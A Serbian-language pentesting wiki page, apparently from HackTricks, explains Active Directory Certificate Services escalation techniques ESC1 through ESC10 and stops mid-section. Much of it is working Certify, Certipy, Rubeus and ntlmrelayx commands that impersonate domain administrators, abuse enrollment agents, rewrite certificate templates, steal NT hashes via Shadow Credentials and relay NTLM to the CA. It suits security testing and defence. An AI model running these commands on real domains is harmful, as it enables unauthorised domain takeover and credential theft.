# AD CS Domain Escalation

{{#include ../../../banners/hacktricks-training.md}}

**Ovo je sažetak sekcija tehnika eskalacije iz postova:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Pogrešno konfigurisani šabloni sertifikata - ESC1

### Objašnjenje

### Pogrešno konfigurisani šabloni sertifikata - ESC1 Objašnjeno

- **Prava na upis su dodeljena korisnicima sa niskim privilegijama od strane Enterprise CA.**
- **Odobrenje menadžera nije potrebno.**
- **Nisu potrebni potpisi ovlašćenog osoblja.**
- **Bezbednosni opisi na šablonima sertifikata su previše permisivni, omogućavajući korisnicima sa niskim privilegijama da dobiju prava na upis.**
- **Šabloni sertifikata su konfigurisani da definišu EKU-e koji olakšavaju autentifikaciju:**
- Identifikatori Extended Key Usage (EKU) kao što su Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0), ili bez EKU (SubCA) su uključeni.
- **Mogućnost da tražioci uključe subjectAltName u Zahtev za potpisivanje sertifikata (CSR) je dozvoljena šablonom:**
- Active Directory (AD) prioritizuje subjectAltName (SAN) u sertifikatu za verifikaciju identiteta ako je prisutan. To znači da specificiranjem SAN-a u CSR-u, može se zatražiti sertifikat za impersonaciju bilo kog korisnika (npr. administratora domena). Da li tražilac može da specificira SAN označeno je u AD objektu šablona sertifikata kroz svojstvo `mspki-certificate-name-flag`. Ovo svojstvo je bitmask, a prisustvo `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` zastavice omogućava specificiranje SAN-a od strane tražioca.

> [!CAUTION]
> Konfiguracija opisana omogućava korisnicima sa niskim privilegijama da traže sertifikate sa bilo kojim SAN-om po izboru, omogućavajući autentifikaciju kao bilo koji domen principal kroz Kerberos ili SChannel.

Ova funkcija je ponekad omogućena da podrži generisanje HTTPS ili host sertifikata u hodu od strane proizvoda ili usluga implementacije, ili zbog nedostatka razumevanja.

Napomena je da kreiranje sertifikata sa ovom opcijom pokreće upozorenje, što nije slučaj kada se postojeći šablon sertifikata (kao što je `WebServer` šablon, koji ima `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` omogućeno) duplicira i zatim modifikuje da uključuje autentifikacijski OID.

### Zloupotreba

Da **pronađete ranjive šablone sertifikata** možete pokrenuti:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
Da bi se **iskoristila ova ranjivost za oponašanje administratora**, može se pokrenuti:
```bash
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:localadmin
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'ESC1' -upn 'administrator@corp.local'
```
Zatim možete transformisati generisani **sertifikat u `.pfx`** format i koristiti ga za **autentifikaciju koristeći Rubeus ili certipy** ponovo:
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Windows binarni fajlovi "Certreq.exe" i "Certutil.exe" mogu se koristiti za generisanje PFX: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

Enumeracija šablona sertifikata unutar konfiguracionog sheme AD šume, posebno onih koji ne zahtevaju odobrenje ili potpise, koji poseduju Client Authentication ili Smart Card Logon EKU, i sa `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` oznakom omogućenom, može se izvršiti pokretanjem sledeće LDAP upita:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Neispravno Konfigurisani Šabloni Sertifikata - ESC2

### Objašnjenje

Drugi scenario zloupotrebe je varijacija prvog:

1. Prava za upis dodeljuju se korisnicima sa niskim privilegijama od strane Enterprise CA.
2. Zahtev za odobrenje menadžera je onemogućen.
3. Potreba za ovlašćenim potpisima je izostavljena.
4. Previše permisivan bezbednosni opis na šablonu sertifikata dodeljuje prava za upis sertifikata korisnicima sa niskim privilegijama.
5. **Šablon sertifikata je definisan da uključuje Any Purpose EKU ili nema EKU.**

**Any Purpose EKU** omogućava napadaču da dobije sertifikat za **bilo koju svrhu**, uključujući autentifikaciju klijenta, autentifikaciju servera, potpisivanje koda itd. Ista **tehnika korišćena za ESC3** može se koristiti za iskorišćavanje ovog scenarija.

Sertifikati sa **nema EKU**, koji deluju kao sertifikati podređenih CA, mogu se zloupotrebiti za **bilo koju svrhu** i mogu **takođe biti korišćeni za potpisivanje novih sertifikata**. Stoga, napadač može odrediti proizvoljne EKU ili polja u novim sertifikatima koristeći sertifikat podređene CA.

Međutim, novi sertifikati kreirani za **autentifikaciju domena** neće funkcionisati ako podređena CA nije poverena od strane **`NTAuthCertificates`** objekta, što je podrazumevano podešavanje. Ipak, napadač može i dalje kreirati **nove sertifikate sa bilo kojim EKU** i proizvoljnim vrednostima sertifikata. Ovi bi mogli biti potencijalno **zloupotrebljeni** za širok spektar svrha (npr. potpisivanje koda, autentifikacija servera itd.) i mogli bi imati značajne posledice za druge aplikacije u mreži kao što su SAML, AD FS ili IPSec.

Da bi se enumerisali šabloni koji odgovaraju ovom scenariju unutar konfiguracione šeme AD šume, može se izvršiti sledeći LDAP upit:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Neispravno Konfigurisani Šabloni Agenta za Upis - ESC3

### Objašnjenje

Ovaj scenario je sličan prvom i drugom, ali **zloupotrebljava** **drugi EKU** (Agent za Zahtev za Sertifikat) i **2 različita šablona** (stoga ima 2 seta zahteva),

**EKU Agenta za Zahtev za Sertifikat** (OID 1.3.6.1.4.1.311.20.2.1), poznat kao **Agent za Upis** u Microsoft dokumentaciji, omogućava principalu da **upisuje** **sertifikat** **u ime drugog korisnika**.

**“Agent za upis”** se upisuje u takav **šablon** i koristi rezultantni **sertifikat da bi ko-potpisao CSR u ime drugog korisnika**. Zatim **šalje** **ko-potpisani CSR** CA, upisujući se u **šablon** koji **dozvoljava “upis u ime”**, a CA odgovara sa **sertifikatom koji pripada “drugom” korisniku**.

**Zahtevi 1:**

- Prava za upis se dodeljuju korisnicima sa niskim privilegijama od strane Enterprise CA.
- Zahtev za odobrenje menadžera je izostavljen.
- Nema zahteva za ovlašćenim potpisima.
- Bezbednosni opis šablona sertifikata je previše permisivan, dodeljujući prava za upis korisnicima sa niskim privilegijama.
- Šablon sertifikata uključuje EKU Agenta za Zahtev za Sertifikat, omogućavajući zahtev za drugim šablonima sertifikata u ime drugih principala.

**Zahtevi 2:**

- Enterprise CA dodeljuje prava za upis korisnicima sa niskim privilegijama.
- Odobrenje menadžera je zaobiđeno.
- Verzija šeme šablona je ili 1 ili prelazi 2, i specificira Zahtev za Politiku Aplikacije koja zahteva EKU Agenta za Zahtev za Sertifikat.
- EKU definisan u šablonu sertifikata dozvoljava autentifikaciju domena.
- Ograničenja za agente za upis se ne primenjuju na CA.

### Zloupotreba

Možete koristiti [**Certify**](https://github.com/GhostPack/Certify) ili [**Certipy**](https://github.com/ly4k/Certipy) da zloupotrebite ovaj scenario:
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
**Korisnici** koji su ovlašćeni da **dobiju** **sertifikat agenta za upis**, šabloni u kojima su agenti za upis ovlašćeni da se upisuju, i **nalozi** u ime kojih agent za upis može delovati mogu biti ograničeni od strane preduzeća CA. To se postiže otvaranjem `certsrc.msc` **snap-in**-a, **desnim klikom na CA**, **klikom na Svojstva**, a zatim **navigacijom** do taba “Agenti za upis”.

Međutim, primećeno je da je **podrazumevana** postavka za CA “**Ne ograničavaj agente za upis**.” Kada administratori omoguće ograničenje za agente za upis, postavljanjem na “Ograniči agente za upis,” podrazumevana konfiguracija ostaje izuzetno permisivna. Omogućava **Svima** pristup da se upisuju u sve šablone kao bilo ko.

## Kontrola pristupa ranjivim šablonima sertifikata - ESC4

### **Objašnjenje**

**Bezbednosni opis** na **šablonima sertifikata** definiše **dozvole** koje specifični **AD principi** poseduju u vezi sa šablonom.

Ako **napadač** poseduje potrebne **dozvole** da **izmeni** **šablon** i **uspostavi** bilo kakve **iskoristive pogrešne konfiguracije** navedene u **prethodnim sekcijama**, privilegijska eskalacija bi mogla biti olakšana.

Značajne dozvole koje se primenjuju na šablone sertifikata uključuju:

- **Vlasnik:** Daje implicitnu kontrolu nad objektom, omogućavajući modifikaciju bilo kojih atributa.
- **FullControl:** Omogućava potpunu vlast nad objektom, uključujući sposobnost da se menjaju bilo koji atributi.
- **WriteOwner:** Dozvoljava promenu vlasnika objekta na principala pod kontrolom napadača.
- **WriteDacl:** Omogućava prilagođavanje kontrola pristupa, potencijalno dajući napadaču FullControl.
- **WriteProperty:** Ovlašćuje uređivanje bilo kojih svojstava objekta.

### Zloupotreba

Primer privesc-a kao prethodni:

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 je kada korisnik ima privilegije pisanja nad šablonom sertifikata. Ovo se može, na primer, zloupotrebiti da se prepiše konfiguracija šablona sertifikata kako bi se šablon učinio ranjivim na ESC1.

Kao što možemo videti u putanji iznad, samo `JOHNPC` ima ove privilegije, ali naš korisnik `JOHN` ima novu `AddKeyCredentialLink` ivicu prema `JOHNPC`. Pošto je ova tehnika povezana sa sertifikatima, implementirao sam i ovaj napad, koji je poznat kao [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab). Evo malog pregleda Certipy-ove `shadow auto` komande za preuzimanje NT heša žrtve.
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** može prepisati konfiguraciju šablona sertifikata jednim komandama. Po **default-u**, Certipy će **prepisati** konfiguraciju kako bi je učinio **ranjivom na ESC1**. Takođe možemo odrediti **`-save-old` parametar za čuvanje stare konfiguracije**, što će biti korisno za **obnavljanje** konfiguracije nakon našeg napada.
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Vulnerable PKI Object Access Control - ESC5

### Objašnjenje

Opsežna mreža međusobno povezanih ACL zasnovanih odnosa, koja uključuje nekoliko objekata pored šablona sertifikata i sertifikacione vlasti, može uticati na bezbednost celog AD CS sistema. Ovi objekti, koji mogu značajno uticati na bezbednost, obuhvataju:

- AD računar objekat CA servera, koji može biti kompromitovan putem mehanizama kao što su S4U2Self ili S4U2Proxy.
- RPC/DCOM server CA servera.
- Bilo koji potomak AD objekta ili kontejner unutar specifične putanje kontejnera `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. Ova putanja uključuje, ali nije ograničena na, kontejnere i objekte kao što su kontejner Šablona sertifikata, kontejner Sertifikacionih vlasti, objekat NTAuthCertificates i kontejner Usluga upisa.

Bezbednost PKI sistema može biti kompromitovana ako napadač sa niskim privilegijama uspe da preuzme kontrolu nad bilo kojim od ovih kritičnih komponenti.

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Objašnjenje

Tema o kojoj se raspravlja u [**CQure Academy postu**](https://cqureacademy.com/blog/enhanced-key-usage) takođe se dotiče implikacija **`EDITF_ATTRIBUTESUBJECTALTNAME2`** oznake, kako je navedeno od strane Microsoft-a. Ova konfiguracija, kada je aktivirana na Sertifikacionoj vlasti (CA), omogućava uključivanje **korisnički definisanih vrednosti** u **alternativno ime subjekta** za **bilo koji zahtev**, uključujući one konstruisane iz Active Directory®. Kao rezultat, ova odredba omogućava **napadaču** da se upiše putem **bilo kog šablona** postavljenog za **autentifikaciju** domena—specifično onih otvorenih za upis **neprivilegovanih** korisnika, poput standardnog šablona korisnika. Kao rezultat, može se obezbediti sertifikat, omogućavajući napadaču da se autentifikuje kao administrator domena ili **bilo koja druga aktivna entitet** unutar domena.

**Napomena**: Pristup za dodavanje **alternativnih imena** u Zahtev za potpisivanje sertifikata (CSR), putem argumenta `-attrib "SAN:"` u `certreq.exe` (poznat kao “Parovi imena i vrednosti”), predstavlja **kontrast** od strategije eksploatacije SAN-ova u ESC1. Ovde, razlika leži u **načinu na koji je informacija o računu enkapsulirana**—unutar atributa sertifikata, a ne ekstenzije.

### Zloupotreba

Da bi proverile da li je postavka aktivirana, organizacije mogu koristiti sledeću komandu sa `certutil.exe`:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
Ova operacija suštinski koristi **remote registry access**, stoga, alternativni pristup može biti:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
Alati kao što su [**Certify**](https://github.com/GhostPack/Certify) i [**Certipy**](https://github.com/ly4k/Certipy) su sposobni da otkriju ovu pogrešnu konfiguraciju i iskoriste je:
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
Da bi se izmenile ove postavke, pod pretpostavkom da se poseduje **administratorska** prava domena ili ekvivalentna, sledeća komanda može biti izvršena sa bilo koje radne stanice:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
Da biste onemogućili ovu konfiguraciju u vašem okruženju, zastavica se može ukloniti sa:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
> [!WARNING]
> Nakon bezbednosnih ažuriranja iz maja 2022. godine, novoizdati **certifikati** će sadržati **bezbednosnu ekstenziju** koja uključuje **`objectSid` svojstvo zahtevaoca**. Za ESC1, ovaj SID se izvodi iz specificiranog SAN-a. Međutim, za **ESC6**, SID odražava **`objectSid` zahtevaoca**, a ne SAN.\
> Da bi se iskoristio ESC6, neophodno je da sistem bude podložan ESC10 (Slabe Mape Certifikata), koji daje prioritet **SAN-u nad novom bezbednosnom ekstenzijom**.

## Kontrola Pristupa Ranljive Certifikacione Autoritete - ESC7

### Napad 1

#### Objašnjenje

Kontrola pristupa za certifikacionu vlast održava se kroz skup dozvola koje regulišu radnje CA. Ove dozvole se mogu pregledati pristupanjem `certsrv.msc`, desnim klikom na CA, odabirom svojstava, a zatim navigacijom do kartice Bezbednost. Pored toga, dozvole se mogu enumerisati koristeći PSPKI modul sa komandama kao što su:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
Ovo pruža uvid u primarna prava, naime **`ManageCA`** i **`ManageCertificates`**, koja se odnose na uloge “CA administratora” i “Menadžera sertifikata” respektivno.

#### Zloupotreba

Imanje **`ManageCA`** prava na sertifikacionoj vlasti omogućava glavnom korisniku da manipuliše podešavanjima na daljinu koristeći PSPKI. Ovo uključuje prebacivanje **`EDITF_ATTRIBUTESUBJECTALTNAME2`** oznake kako bi se omogućila SAN specifikacija u bilo kojem šablonu, što je kritičan aspekt eskalacije domena.

Pojednostavljenje ovog procesa je ostvarivo korišćenjem PSPKI-ove **Enable-PolicyModuleFlag** cmdlet, što omogućava izmene bez direktne interakcije sa GUI-jem.

Posedovanje **`ManageCertificates`** prava olakšava odobravanje čekajućih zahteva, efikasno zaobilazeći zaštitu "odobrenja menadžera sertifikata CA".

Kombinacija **Certify** i **PSPKI** modula može se koristiti za zahtev, odobravanje i preuzimanje sertifikata:
```powershell
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Napad 2

#### Objašnjenje

> [!WARNING]
> U **prethodnom napadu** **`Manage CA`** dozvole su korišćene da se **omogući** **EDITF_ATTRIBUTESUBJECTALTNAME2** zastavica za izvođenje **ESC6 napada**, ali to neće imati nikakav efekat dok se CA servis (`CertSvc`) ne restartuje. Kada korisnik ima pravo pristupa **`Manage CA`**, korisniku je takođe dozvoljeno da **restartuje servis**. Međutim, to **ne znači da korisnik može da restartuje servis na daljinu**. Pored toga, **ESC6 možda neće raditi odmah** u većini zakrpljenih okruženja zbog bezbednosnih ažuriranja iz maja 2022.

Stoga, ovde je predstavljen još jedan napad.

Preduvjeti:

- Samo **`ManageCA` dozvola**
- **`Manage Certificates`** dozvola (može se dodeliti iz **`ManageCA`**)
- Šablon sertifikata **`SubCA`** mora biti **omogućen** (može se omogućiti iz **`ManageCA`**)

Tehnika se oslanja na činjenicu da korisnici sa pravima pristupa **`Manage CA`** _i_ **`Manage Certificates`** mogu **izdavati neuspela zahteva za sertifikate**. Šablon sertifikata **`SubCA`** je **ranjiv na ESC1**, ali **samo administratori** mogu da se upišu u šablon. Tako, **korisnik** može **zatražiti** da se upiše u **`SubCA`** - što će biti **odbijeno** - ali **zatim izdano od strane menadžera**.

#### Zloupotreba

Možete **dodeliti sebi pravo pristupa `Manage Certificates`** dodavanjem svog korisnika kao novog službenika.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
**`SubCA`** шаблон може бити **омогућен на CA** са параметром `-enable-template`. По подразумеваној вредности, `SubCA` шаблон је омогућен.
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
Ako smo ispunili preduslove za ovaj napad, možemo početi sa **zahtevom za sertifikat na osnovu `SubCA` šablona**.

**Ovaj zahtev će biti odbijen**, ali ćemo sačuvati privatni ključ i zabeležiti ID zahteva.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
Sa našim **`Manage CA` i `Manage Certificates`**, možemo zatim **izdati neuspešni zahtev za sertifikat** koristeći `ca` komandu i `-issue-request <request ID>` parametar.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
I na kraju, možemo **preuzeti izdate sertifikate** pomoću `req` komande i `-retrieve <request ID>` parametra.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
## NTLM Relay to AD CS HTTP Endpoints – ESC8

### Objašnjenje

> [!NOTE]
> U okruženjima gde je **AD CS instaliran**, ako postoji **vulnerabilni web enrollment endpoint** i najmanje jedan **sertifikatni šablon je objavljen** koji dozvoljava **upis domena i autentifikaciju klijenata** (kao što je podrazumevani **`Machine`** šablon), postaje moguće da **bilo koji računar sa aktivnom spooler uslugom bude kompromitovan od strane napadača**!

Nekoliko **HTTP-baziranih metoda upisa** podržava AD CS, dostupnih kroz dodatne server uloge koje administratori mogu instalirati. Ove interfejse za HTTP-bazirani upis sertifikata su podložni **NTLM relay napadima**. Napadač, sa **kompromitovane mašine, može da se pretvara da je bilo koji AD nalog koji se autentifikuje putem dolaznog NTLM**. Dok se pretvara da je žrtva, ove web interfejse može da pristupi napadač da **zatraži sertifikat za autentifikaciju klijenta koristeći `User` ili `Machine` sertifikatne šablone**.

- **Web enrollment interfejs** (starija ASP aplikacija dostupna na `http://<caserver>/certsrv/`), podrazumevano koristi samo HTTP, što ne nudi zaštitu od NTLM relay napada. Pored toga, izričito dozvoljava samo NTLM autentifikaciju kroz svoj Authorization HTTP header, čineći sigurnije metode autentifikacije poput Kerberos neprimenljivim.
- **Sertifikatna usluga upisa** (CES), **Politika upisa sertifikata** (CEP) Web Service, i **Usluga upisa mrežnih uređaja** (NDES) podrazumevano podržavaju negotiate autentifikaciju putem svog Authorization HTTP header-a. Negotiate autentifikacija **podržava i** Kerberos i **NTLM**, omogućavajući napadaču da **smanji na NTLM** autentifikaciju tokom relay napada. Iako ove web usluge podrazumevano omogućavaju HTTPS, HTTPS sam po sebi **ne štiti od NTLM relay napada**. Zaštita od NTLM relay napada za HTTPS usluge je moguća samo kada se HTTPS kombinuje sa channel binding. Nažalost, AD CS ne aktivira Extended Protection for Authentication na IIS-u, što je potrebno za channel binding.

Uobičajeni **problem** sa NTLM relay napadima je **kratko trajanje NTLM sesija** i nemogućnost napadača da interaguje sa uslugama koje **zahtevaju NTLM potpisivanje**.

Ipak, ova ograničenja se prevazilaze iskorišćavanjem NTLM relay napada za sticanje sertifikata za korisnika, jer period važenja sertifikata određuje trajanje sesije, a sertifikat se može koristiti sa uslugama koje **zahtevaju NTLM potpisivanje**. Za uputstva o korišćenju ukradenog sertifikata, pogledajte:

{{#ref}}
account-persistence.md
{{#endref}}

Još jedno ograničenje NTLM relay napada je to što **mašina pod kontrolom napadača mora biti autentifikovana od strane žrtvinog naloga**. Napadač može ili čekati ili pokušati da **prisili** ovu autentifikaciju:

{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Zloupotreba**

[**Certify**](https://github.com/GhostPack/Certify)’s `cas` enumerates **enabled HTTP AD CS endpoints**:
```
Certify.exe cas
```
<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

Svojstvo `msPKI-Enrollment-Servers` koristi preduzeće Certificate Authorities (CAs) za čuvanje tačaka krajnjeg korisnika Certificate Enrollment Service (CES). Ove tačke se mogu analizirati i navesti korišćenjem alata **Certutil.exe**:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>
```powershell
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Zloupotreba sa Certify
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### Abuse with [Certipy](https://github.com/ly4k/Certipy)

Zahtev za sertifikat se po defaultu pravi putem Certipy na osnovu šablona `Machine` ili `User`, u zavisnosti od toga da li se ime naloga koje se preusmerava završava sa `$`. Specifikacija alternativnog šablona može se postići korišćenjem `-template` parametra.

Tehnika poput [PetitPotam](https://github.com/ly4k/PetitPotam) se zatim može koristiti za primoravanje autentifikacije. Kada se radi sa domen kontrolerima, neophodno je specificirati `-template DomainController`.
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## No Security Extension - ESC9 <a href="#id-5485" id="id-5485"></a>

### Objašnjenje

Nova vrednost **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) za **`msPKI-Enrollment-Flag`**, poznata kao ESC9, sprečava umetanje **nove `szOID_NTDS_CA_SECURITY_EXT` sigurnosne ekstenzije** u sertifikat. Ova oznaka postaje relevantna kada je `StrongCertificateBindingEnforcement` postavljen na `1` (podrazumevano podešavanje), što se razlikuje od podešavanja `2`. Njena relevantnost se povećava u scenarijima gde bi slabija mapa sertifikata za Kerberos ili Schannel mogla biti iskorišćena (kao u ESC10), s obzirom na to da odsustvo ESC9 ne bi promenilo zahteve.

Uslovi pod kojima postavka ove oznake postaje značajna uključuju:

- `StrongCertificateBindingEnforcement` nije podešen na `2` (sa podrazumevanjem `1`), ili `CertificateMappingMethods` uključuje `UPN` oznaku.
- Sertifikat je označen oznakom `CT_FLAG_NO_SECURITY_EXTENSION` unutar podešavanja `msPKI-Enrollment-Flag`.
- Bilo koja EKU za autentifikaciju klijenta je specificirana sertifikatom.
- `GenericWrite` dozvole su dostupne za bilo koji nalog kako bi se kompromitovao drugi.

### Scenarij zloupotrebe

Pretpostavimo da `John@corp.local` ima `GenericWrite` dozvole nad `Jane@corp.local`, sa ciljem da kompromituje `Administrator@corp.local`. `ESC9` šablon sertifikata, u koji `Jane@corp.local` može da se upiše, konfiguriše se sa oznakom `CT_FLAG_NO_SECURITY_EXTENSION` u svom podešavanju `msPKI-Enrollment-Flag`.

U početku, `Jane`-in hash se stiče korišćenjem Shadow Credentials, zahvaljujući `John`-ovom `GenericWrite`:
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
Nakon toga, `Jane`'s `userPrincipalName` se menja u `Administrator`, namerno izostavljajući deo domena `@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Ova modifikacija ne krši ograničenja, s obzirom na to da `Administrator@corp.local` ostaje različit kao `userPrincipalName` `Administratora`.

Nakon toga, `ESC9` šablon sertifikata, označen kao ranjiv, se traži kao `Jane`:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
Napomena je da `userPrincipalName` sertifikata odražava `Administrator`, bez ikakvog “object SID”.

`Jane`-in `userPrincipalName` se zatim vraća na njen originalni, `Jane@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Pokušaj autentifikacije sa izdatom sertifikatom sada daje NT hash `Administrator@corp.local`. Komanda mora uključivati `-domain <domain>` zbog nedostatka specifikacije domena u sertifikatu:
```bash
certipy auth -pfx adminitrator.pfx -domain corp.local
```
## Slabe Mape Sertifikata - ESC10

### Objašnjenje

Dve vrednosti registarskih ključeva na kontroleru domena se nazivaju ESC10:

- Podrazumevana vrednost za `CertificateMappingMethods` pod `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` je `0x18` (`0x8 | 0x10`), prethodno postavljena na `0x1F`.
- Podrazumevana postavka za `StrongCertificateBindingEnforcement` pod `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` je `1`, prethodno `0`.

**Slučaj 1**

Kada je `StrongCertificateBindingEnforcement` konfigurisan kao `0`.

**Slučaj 2**

